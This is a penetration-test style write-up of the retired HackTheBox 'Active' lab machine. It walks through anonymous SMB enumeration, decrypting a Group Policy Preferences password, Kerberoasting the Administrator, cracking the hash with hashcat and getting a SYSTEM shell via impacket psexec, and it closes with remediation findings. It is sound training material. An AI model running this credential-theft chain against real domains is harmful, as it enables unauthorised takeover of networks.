# HTB Active - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-18

---

## 0. Lesson Learned

Admin accounts should not have SPNs.

---

## 1. Executive Summary

An external penetration test was conducted against the target system. The host was identified as a Windows Server 2008 R2 Domain Controller.

The assessment identified multiple critical misconfigurations:

- Anonymous SMB access
- Exposure of Group Policy Preferences (GPP) credentials
- Weak service account password
- Kerberoastable Domain Administrator account

Through chained abuse of these weaknesses, full Domain Administrator compromise was achieved, resulting in SYSTEM-level access to the Domain Controller.

Impact: Complete domain compromise.

---

## 2. Scope

- **Target:** 10.129.245.60
- **Environment:** HackTheBox Active (Retired Machine)
- **Testing Window:** 2026-2-18
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.245.60 -T4 -oA active_initial
```

Key Findings:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 389/tcp - LDAP
- 445/tcp - SMB
- 3268/tcp - Global Catalog LDAP
- Multiple RPC high ports

The presence of Kerberos, LDAP, and Global Catalog confirmed the host as an Active Directory Domain Controller.

---

## 5. Enumeration

SMB Share Enumeration (Anonymous Login):

```
smbclient -L \\10.129.245.60 -N
```

Shares identified:

- ADMIN$
- C$
- IPC$
- NETLOGON
- SYSVOL
- Replication
- Users

NETLOGON and SYSVOL strongly suggested a Domain Controller.

Attempted SYSVOL access denied.

Replication share enumerated:

```
smbclient //10.129.245.60/Replication -N

recurse on

prompt off

ls
```

GPP file discovered:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

---

## 6. Initial Access

Downloaded Groups.xml

```
cd active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups

get Groups.xml
```

Identify `cpassword` encrypted credential for account `active.htb\SVC_TGS`:

```
grep -i cpassword Groups.xml
```

Decrypt GPP Password

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Recovered password:

```
GPPstillStandingStrong2k18
```

Credentials validated:

```
crackmapexec smb 10.129.245.60 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

Authentication successful.

---

## 7. Post-Exploitation

Identify Kerberoastable Accounts:

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.245.60
```

SPN discovered for Administrator (`active/CIFS:445`) indicating Administrator account is Kerberoastable.

Request Service Ticket:

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.245.60 -request
```

Kerberos TGS hash retrieved and saved to file.

Hash cracked with Hashcat:

```
hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt --force
```

Recovered credentials:

```
Administrator : Ticketmaster1968
```

---

## 8. Privilege Escalation

Administrator Access Validated:

```
crackmapexec smb 10.129.245.60 -u Administrator -p 'Ticketmaster1968'
```

Resulting in confirmed local admin on Domain Controller.

System shell obtained as `nt authority\system` with Psexec:

```
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.245.60
```

Full Domain Controller compromise achieved.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\SVC_TGS\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous SMB Share Access

**Severity:** Critical

**Description:**
SMB shares were accessible without authentication, allowing anonymous enumeration of files and directories.

**Impact:**
Attackers could access sensitive data, identify credential files, or discover information useful for further compromise.

**Recommendation:**
Disable null sessions, restrict anonymous access to SMB shares, and enforce authentication for all file share access.

### **Finding:** Group Policy Preference Password Exposure

**Severity:** Critical

**Description:**
Group Policy Preferences stored credentials using a reversible encryption method with a publicly known key, allowing password recovery.

**Impact:**
Attackers could extract and decrypt stored credentials, potentially gaining administrative access to the domain.

**Recommendation:**
Remove all Group Policy Preference passwords, implement LAPS or gMSA accounts, and audit SYSVOL and replication permissions.

### **Finding:** Kerberoastable Administrator Account

**Severity:** Critical

**Description:**
A highly privileged account had a Service Principal Name (SPN) configured, making it vulnerable to Kerberoasting attacks.

**Impact:**
Attackers could request service tickets, crack the password offline, and gain domain administrator privileges.

**Recommendation:**
Remove SPNs from privileged accounts, use dedicated service accounts, and enforce strong, random passwords.

### **Finding:** Weak Domain Administrator Password

**Severity:** Critical

**Description:**
A domain administrator account used a weak password that was susceptible to offline cracking.

**Impact:**
Attackers could recover the password and gain full control of the domain.

**Recommendation:**
Enforce long, random passwords for privileged accounts, monitor Event ID 4769 for suspicious ticket activity, and implement regular password rotation policies.